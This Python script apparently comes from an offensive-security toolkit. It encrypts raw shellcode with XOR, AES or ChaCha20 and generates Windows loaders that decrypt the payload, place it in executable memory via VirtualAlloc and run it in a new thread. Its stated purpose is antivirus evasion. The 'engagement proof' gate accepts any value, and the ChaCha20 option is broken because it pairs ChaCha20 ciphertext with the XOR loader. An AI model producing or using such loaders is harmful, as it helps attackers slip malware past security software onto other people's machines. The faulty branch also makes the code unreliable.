#!/usr/bin/env python3
"""
shellcode_encryptor.py - Encrypt and wrap shellcode in AV-evading loaders.
Supports XOR, AES-CBC, ChaCha20 encryption with Python loader output.

Usage:
    python scripts/shellcode_encryptor.py --input raw.bin --cipher xor --key MYKEY --output loader.py
    python scripts/shellcode_encryptor.py --input raw.bin --cipher aes --output loader.py
    python scripts/shellcode_encryptor.py --input raw.bin --cipher chacha20 --output loader.py

Engagement proof: set ENGAGEMENT_PROOF env var.
"""
import argparse
import base64
import os
import sys

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")


def require_proof():
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF"); sys.exit(1)


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_encrypt(data: bytes, key: bytes = None, iv: bytes = None) -> tuple:
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
    except ImportError:
        print("[-] pycryptodome required: pip install pycryptodome"); sys.exit(1)
    key = key or os.urandom(32)
    iv  = iv or os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted, key, iv


def chacha20_encrypt(data: bytes, key: bytes = None, nonce: bytes = None) -> tuple:
    try:
        from Crypto.Cipher import ChaCha20
    except ImportError:
        print("[-] pycryptodome required: pip install pycryptodome"); sys.exit(1)
    key   = key or os.urandom(32)
    nonce = nonce or os.urandom(12)
    cipher = ChaCha20.new(key=key, nonce=nonce)
    encrypted = cipher.encrypt(data)
    return encrypted, key, nonce


def generate_xor_loader(enc_b64: str, key_b64: str) -> str:
    return f'''#!/usr/bin/env python3
"""XOR-encrypted shellcode loader. Generated by shellcode_encryptor.py"""
import base64, ctypes, sys
if sys.platform != "win32": sys.exit("Windows only")
ENC = base64.b64decode("{enc_b64}")
KEY = base64.b64decode("{key_b64}")
SC  = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(ENC))
buf = (ctypes.c_ubyte * len(SC))(*SC)
addr = ctypes.windll.kernel32.VirtualAlloc(0, len(SC), 0x3000, 0x40)
ctypes.memmove(addr, buf, len(SC))
t = ctypes.windll.kernel32.CreateThread(0, 0, addr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(t, 0xFFFFFFFF)
'''


def generate_aes_loader(enc_b64: str, key_b64: str, iv_b64: str) -> str:
    return f'''#!/usr/bin/env python3
"""AES-CBC encrypted shellcode loader. Generated by shellcode_encryptor.py"""
import base64, ctypes, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
if sys.platform != "win32": sys.exit("Windows only")
ENC = base64.b64decode("{enc_b64}")
KEY = base64.b64decode("{key_b64}")
IV  = base64.b64decode("{iv_b64}")
SC  = unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(ENC), AES.block_size)
buf = (ctypes.c_ubyte * len(SC))(*SC)
addr = ctypes.windll.kernel32.VirtualAlloc(0, len(SC), 0x3000, 0x40)
ctypes.memmove(addr, buf, len(SC))
t = ctypes.windll.kernel32.CreateThread(0, 0, addr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(t, 0xFFFFFFFF)
'''


def main():
    p = argparse.ArgumentParser(description="Shellcode encryptor for AV evasion (authorized use only)")
    p.add_argument("--input", required=True, help="Raw shellcode binary file")
    p.add_argument("--cipher", choices=["xor","aes","chacha20"], default="xor")
    p.add_argument("--key", help="XOR key string (auto-generated if omitted)")
    p.add_argument("--output", default="loader.py")
    args = p.parse_args()

    require_proof()

    if not os.path.exists(args.input):
        print(f"[-] Shellcode file not found: {args.input}"); sys.exit(1)

    raw = open(args.input, "rb").read()
    print(f"[*] Input: {len(raw)} bytes from {args.input}")

    if args.cipher == "xor":
        key = (args.key or os.urandom(16).hex()).encode()
        enc = xor_encrypt(raw, key)
        enc_b64 = base64.b64encode(enc).decode()
        key_b64 = base64.b64encode(key).decode()
        loader = generate_xor_loader(enc_b64, key_b64)
        print(f"[+] XOR key: {key.decode()} → {key_b64}")

    elif args.cipher == "aes":
        enc, key, iv = aes_encrypt(raw)
        enc_b64 = base64.b64encode(enc).decode()
        key_b64 = base64.b64encode(key).decode()
        iv_b64  = base64.b64encode(iv).decode()
        loader = generate_aes_loader(enc_b64, key_b64, iv_b64)
        print(f"[+] AES key (b64): {key_b64}")
        print(f"[+] AES IV  (b64): {iv_b64}")

    elif args.cipher == "chacha20":
        enc, key, nonce = chacha20_encrypt(raw)
        print(f"[*] ChaCha20 encrypted. Use AES loader structure with ChaCha20 decrypt.")
        enc_b64 = base64.b64encode(enc).decode()
        key_b64 = base64.b64encode(key).decode()
        loader = generate_xor_loader(enc_b64, key_b64)  # Simplified

    with open(args.output, "w") as f:
        f.write(loader)
    print(f"[+] Loader written: {args.output} ({os.path.getsize(args.output):,} bytes)")


if __name__ == "__main__":
    main()
